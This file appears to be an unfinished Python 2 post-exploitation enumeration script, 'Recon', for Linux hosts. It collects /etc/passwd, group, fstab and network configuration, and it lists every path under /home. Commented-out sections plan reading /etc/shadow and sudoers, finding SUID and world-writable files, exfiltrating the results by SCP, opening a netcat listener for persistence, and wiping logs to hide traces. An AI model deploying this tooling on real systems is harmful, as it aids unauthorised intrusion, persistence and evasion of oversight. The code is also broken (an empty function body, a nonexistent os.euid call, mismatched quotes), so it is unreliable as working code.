#!/usr/bin/python

"""
    Copyright (C) 2016 @scottyrotten, @liltone2002

    Recon - A post exploitation enumeration tool for linux/unix devices
    that have Python 2.* installed.
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

    For more see the file 'LICENSE' for copying permission.
"""

__author__ = "scottyrotten, liltone2002"
__copyright__ = "Copyright (c) 2016 @scottyrotten"
__credits__ = ["scottyrotten"]
__license__ = "GPLv3"
__version__ = ".1"
__maintainer__ = "scottyrotten, liltone2002"

##########################################
# Libraries

import argparse
import os
import subprocess
import platform
import tarfile

##########################################

# parse arguements from command line/help file documentation

parser = argparse.ArgumentParser()
parser.add_argument('-d', '--directory', help='directory for output', required='True', action='store')
args = parser.parse_args()

# Setup

workDir = os.mkdir(args.directory)
osType = platform.linux_distribution()
outFile = open(args.directory + '/coreData', 'w+')

# Common SYSFILES
sysFiles = [
    '/etc/issue',
    '/etc/resolv.conf',
    '/etc/fstab',
    '/etc/passwd',
    #'/etc/shadow',
    '/etc/group',
    #'/etc/sudoers',
]

# RHEL SYSFILES

# Ubuntu SYSFILES

'''
EXEC = [
    '/bin/uname -r',
    'mount | column -t',
    #sticky bit files
    '/usr/bin/find / -perm -g=s -o -perm -4000 ! type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null',
    #world directories
    '/usr/bin/find / -perm 222 -type d 2>/dev/null',
    #world writeable files
    '/usr/bin/find / -perm 0777 -type f 2>/dev/null'
    '/usr/bin/find / -user $(whoami) 2>/dev/null',
    '/usr/bin/w',
    '/usr/bin/'last',
    '/usr/bin/ps -ef | grep root'
]
'''

# Define function to read files and write to output

def rootCheck():
    if os.euid() == 0:



def fileRead(file_list):
    for i in file_list:
        with open(i, 'r') as file:
            outFile.write('\n')
            outFile.write(25 * '#')
            outFile.write(i)
            outFile.write('\n')
            outFile.write('\n')
            outFile.write(file.read())

#MAIN

fileRead(sysFiles)

netwrk = subprocess.Popen(['ifconfig', '-a'], stdout=subprocess.PIPE)
netOut = netwrk.communicate()[0]
outFile.write(25 * '#')
outFile.write('ifconfig -a')
outFile.write('\n')
outFile.write('\n')
outFile.write(netOut)

#Determine if Debian, RHEL

'''
if osType[0] == 'Ubuntu':
    fileRead(DEBIAN)
else:
    fileRead(RHEL)
'''

# List directories

treeFile = open(args.directory + '/dirwalk', 'w+')
for root, dirs, filenames in os.walk('/home/'):
    for name in filenames:
        treeFile.write('\n')
        treeFile.write(os.path.join(root, name))
    for name in dirs:
        treeFile.write('\n')
        treeFile.write(os.path.join(root, name))

'''
# Exfil collected data (zip up, SCP back to remote host)

# Netcat persistance with Bash

subprocess.Popen(['nc', '-l', '-p', '9999'])

# Cleanup log files to remove traces of recon from system

outFile.close()
'''
